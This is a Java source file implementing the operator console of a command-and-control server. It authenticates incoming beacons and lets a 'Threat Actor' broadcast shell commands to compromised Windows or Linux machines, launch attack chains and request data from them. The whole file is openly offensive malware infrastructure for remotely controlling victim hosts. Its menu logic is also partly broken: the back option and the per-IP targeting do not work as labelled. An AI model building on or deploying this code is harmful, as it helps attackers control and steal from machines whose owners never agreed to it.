package Servers.C2;

import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.util.HashMap;
import java.util.Scanner;

public class C2ServerUserHandler implements Runnable{
    // Pointer back to the C2 Server
    private C2Server C2server;

    // Scanner for the user to enter input
    private Scanner userInputScanner;

    // Hashed Password for authentication betwen the Server and the Beacon
    private String passwordDigest;

    // This is a Hash Map of Long Range Beacons that are waiting for MFA.
    // The Key is the IP Address of the Beacon, and the Value is it's status,
    // "Waiting", "Approved", or "Denied"
    private HashMap<String,String> beaconsWaitingForMFA;

    // The User's current Path in the CLI
    private String currentUserPath;

    /**
     * Class to handle input from the user controlling the C2
     * and send it back to the C2 Server.
     * 
     * @param server Pointer to the C2 Server
     */
    public C2ServerUserHandler(C2Server server){
        this.C2server = server;
        this.userInputScanner = new Scanner(System.in);
        this.passwordDigest = null;
        this.beaconsWaitingForMFA = new HashMap<>();
        this.currentUserPath = "";
    }

    protected String authenticateToC2(String enteredPasswordHash, String IPAddress){
        if(enteredPasswordHash.equals(passwordDigest)){
            beaconsWaitingForMFA.put(IPAddress, "Waiting");
        } else{
            return "Authentication Failed: Incorrect Password";
        }

        try{
            synchronized(beaconsWaitingForMFA){
                beaconsWaitingForMFA.wait();
                if(beaconsWaitingForMFA.get(IPAddress).equals("Approved")){
                    return "Authentication Successful";
                }else{
                    return "Authentication Failed: User Denied MFA Prompt";
                }
            }
            
        }catch(InterruptedException e){
            e.printStackTrace();
        }
        return "Authentication Failed: Authentication Process could not be completed";
        
    }

    /**
     * Used by the C2 Server to output a message to the CLI for the Threat Actor to View
     * 
     * @param message Message to be displayed
     */
    protected void outputToCLI(String message){
        System.out.println(message);
    }

    @Override
    public void run() {
        // User enters password that will be used for authentication
        String password1 = "";
        String password2 = "a";
        while(!(password1.equals(password2))){
            System.out.print("Enter Password for authentication: ");
            password1 = userInputScanner.next();
            System.out.print("Re-enter Password: ");
            password2 = userInputScanner.next();
            if(!(password1.equals(password2))){
                System.out.println("Passwords do not match");
            }
        }

        // This password is then hashed and stored
        try{
            MessageDigest digest = MessageDigest.getInstance("SHA-256");
            byte[] encodedhash = digest.digest(password1.getBytes(StandardCharsets.UTF_8));
            StringBuilder hexString = new StringBuilder(2 * encodedhash.length);
            for (int i = 0; i < encodedhash.length; i++) {
                String hex = Integer.toHexString(0xff & encodedhash[i]);
                if(hex.length() == 1) {
                    hexString.append('0');
                }
                hexString.append(hex);
            }
            passwordDigest = hexString.toString();
        } catch(Exception e){}
        
        // Loop for the User to use the CLI
        String userInput = "";
        while(true){
            // If there are any beacons waiting for MFA, prompt user if they should be allowed to connect.
            synchronized(beaconsWaitingForMFA){
                if(beaconsWaitingForMFA.size() > 0){
                    for(String IPAddress : beaconsWaitingForMFA.keySet()){
                        System.out.print("New Beacon Entered Password Correctly from " + IPAddress + ". Allow connection to C2 Server? (y/n) ");
                        if(userInputScanner.next().toLowerCase().equals("y")){
                            beaconsWaitingForMFA.replace(IPAddress, "Waiting", "Approved");
                        }else{
                            beaconsWaitingForMFA.replace(IPAddress, "Waiting", "Denied");
                        }
                        beaconsWaitingForMFA.remove(IPAddress);
                    }
                    beaconsWaitingForMFA.notifyAll();
                }
            }
            
            if(currentUserPath.equals("")){
                System.out.println("1. Send a command to all Clients");
                System.out.println("2. Launch an Attack Chain");
                System.out.println("3. Request Data from Clients");
                System.out.print(currentUserPath + " >> ");
                userInput = userInputScanner.next();
                if(userInput.equals("1")){
                    currentUserPath = "Command";
                } else if(userInput.equals("2")){
                    currentUserPath = "AttackChain";
                } else if(userInput.equals("3")){
                    currentUserPath = "Request";
                } else {
                    System.out.println("Invalid Input");
                }
            } else if(currentUserPath.equals("Command")){
                System.out.println("1. Send a command to Windows Computers");
                System.out.println("2. Send a command to Linux Computers");
                System.out.println(".. Back");
                System.out.print(currentUserPath + " >> ");
                userInput = userInputScanner.nextLine();
                if(userInput.equals("1")){
                    currentUserPath = "Command Windows";
                } else if(userInput.equals("2")){
                    currentUserPath = "Command Linux";
                } else if(userInput.equals("3")){
                    currentUserPath = "";
                } else {
                    System.out.println("Invalid Input");
                }
            } else if(currentUserPath.equals("Command Windows") || currentUserPath.equals("Command Linux")){
                String OS = currentUserPath.split(" ")[1];
                System.out.println("1. Send a command to all " + OS + " Computers");
                System.out.println("2. Send a command to a specific " + OS + " Computer");
                System.out.println(".. Back");
                System.out.print(currentUserPath + " >> ");
                userInput = userInputScanner.nextLine();
                if(userInput.equals("1")){
                    currentUserPath += "All";
                } else if(userInput.equals("2")){
                    System.out.print("Enter IP Address of desired target >> ");
                } else if(userInput.equals("3")){
                    currentUserPath = "Command";
                } else {
                    System.out.println("Invalid Input");
                }

                if(userInput.equals("1") || userInput.equals("2")){
                    System.out.print("Enter Command to be run >> ");
                    String finalCommand = currentUserPath + userInputScanner.nextLine();
                    C2server.broadcastToBeacons(finalCommand);
                }
                if(userInput.equals("1")){
                    currentUserPath = "Command " + OS;
                }
            }
        }
    }
}